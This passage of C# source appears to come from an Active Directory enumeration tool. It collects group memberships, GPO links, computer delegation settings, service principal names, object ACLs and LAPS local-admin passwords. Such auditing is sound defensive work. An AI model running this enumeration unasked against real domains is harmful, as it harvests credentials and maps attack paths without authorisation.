                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeDeleted", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    LDAPClass.AdGroupDictionary.Add((Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))),(Convert.ToString(AdGroup.Properties["samaccountname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    SearchResult AdGroup = (SearchResult) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = AdGroup.Properties["samaccounttype"].Count != 0 ? Convert.ToString(AdGroup.Properties["samaccounttype"][0]) : "";
                    string ObjectClass = Convert.ToString(AdGroup.Properties["objectclass"][AdGroup.Properties["objectclass"].Count-1]);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";
                    string PrimaryGroupID = "";
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == "foreignSecurityPrincipal")
                    {
                        AccountType = "foreignSecurityPrincipal";
                        MemberName = null;
                        MemberUserName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSid"][0], 0))));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSid"][0], 0))));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSid"][0], 0))));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSid"][0], 0))));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSid"][0], 0))));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSid"][0], 0))));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = "trust";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSid"][0], 0))));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdOU = (SearchResult) record;

                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Properties["name"][0]));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", (AdOU.Properties["description"].Count != 0 ? AdOU.Properties["description"][0] : "")));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Properties["whencreated"][0]));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Properties["whenchanged"][0]));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Properties["distinguishedname"][0]));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Properties["displayname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Properties["name"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Properties["whenCreated"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Properties["whenChanged"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Properties["distinguishedname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Properties["gpcfilesyspath"][0]));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;
                    LDAPClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Properties["distinguishedname"][0]).ToUpper()), (Convert.ToString(AdGPO.Properties["displayname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSOM = (SearchResult) record;

                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = (AdSOM.Properties["gPLink"].Count != 0 ? Convert.ToString(AdSOM.Properties["gPLink"][0]) : "");
                    string GPOName = null;

                    Depth = ((Convert.ToString(AdSOM.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1);
                    if (AdSOM.Properties["gPOptions"].Count != 0)
                    {
                        if ((int) AdSOM.Properties["gPOptions"][0] == 1)
                        {
                            BlockInheritance = true;
                        }
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = LDAPClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? LDAPClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdPrinter = (SearchResult) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Properties["Name"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Properties["serverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", AdPrinter.Properties["printShareName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Properties["driverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Properties["driverVersion"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", AdPrinter.Properties["portName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", AdPrinter.Properties["url"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Properties["whenCreated"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Properties["whenChanged"][0]));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool Dormant = false;
                    bool? Enabled = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    string StrIPAddress = null;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Properties["dnshostname"].Count != 0)
                    {
                        try
                        {
                            StrIPAddress = Convert.ToString(Dns.GetHostEntry(Convert.ToString(AdComputer.Properties["dnshostname"][0])).AddressList[0]);
                        }
                        catch
                        {
                            StrIPAddress = null;
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdComputer.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                    }
                    if (AdComputer.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Properties["pwdlastset"].Count != 0)
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Properties["pwdlastset"][0]));
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) TrustedforDelegation) && ((int) AdComputer.Properties["primarygroupid"][0] == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                    {
                        DelegationType = "Constrained";
                        for (int i = 0; i < AdComputer.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                        {
                            var delegateto = AdComputer.Properties["msDS-AllowedToDelegateTo"][i];
                            DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(',');
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    string SIDHistory = "";
                    if (AdComputer.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdComputer.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdComputer.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    string OperatingSystem = CleanString((AdComputer.Properties["operatingsystem"].Count != 0 ? AdComputer.Properties["operatingsystem"][0] : "-") + " " + (AdComputer.Properties["operatingsystemhotfix"].Count != 0 ? AdComputer.Properties["operatingsystemhotfix"][0] : " ") + " " + (AdComputer.Properties["operatingsystemservicepack"].Count != 0 ? AdComputer.Properties["operatingsystemservicepack"][0] : " ") + " " + (AdComputer.Properties["operatingsystemversion"].Count != 0 ? AdComputer.Properties["operatingsystemversion"][0] : " "));

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? CleanString(AdComputer.Properties["samaccountname"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? CleanString(AdComputer.Properties["name"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", StrIPAddress));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", (AdComputer.Properties["primarygroupid"].Count != 0 ? AdComputer.Properties["primarygroupid"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["objectSID"][0], 0))));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", (AdComputer.Properties["Description"].Count != 0 ? CleanString(AdComputer.Properties["Description"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", (AdComputer.Properties["ms-ds-CreatorSid"].Count != 0 ? Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["ms-ds-CreatorSid"][0], 0)) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdComputer.Properties["useraccountcontrol"].Count != 0 ? AdComputer.Properties["useraccountcontrol"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Properties["whencreated"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Properties["whenchanged"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Properties["distinguishedname"][0]));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    if (AdComputer.Properties["serviceprincipalname"].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in AdComputer.Properties["serviceprincipalname"])
                    {
                        string[] SPNArray = SPN.Split('/');
                        bool flag = true;
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? CleanString(AdComputer.Properties["samaccountname"][0]) : "")));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? CleanString(AdComputer.Properties["name"][0]) : "")));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool? Enabled = null;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdComputer.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count != 0)
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Properties["ms-mcs-admpwdexpirationtime"][0]));
                        PasswordStored = true;
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : AdComputer.Properties["cn"][0] )));
                    LAPSObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? AdComputer.Properties["ms-mcs-admpwd"][0] : null)));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            LDAPClass.AdSIDDictionary.Add(Convert.ToString(new SecurityIdentifier((byte[])AdObject.Properties["objectSID"][0], 0)), (Convert.ToString(AdObject.Properties["name"][0])));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", LDAPClass.AdSIDDictionary.ContainsKey(Owner) ? LDAPClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
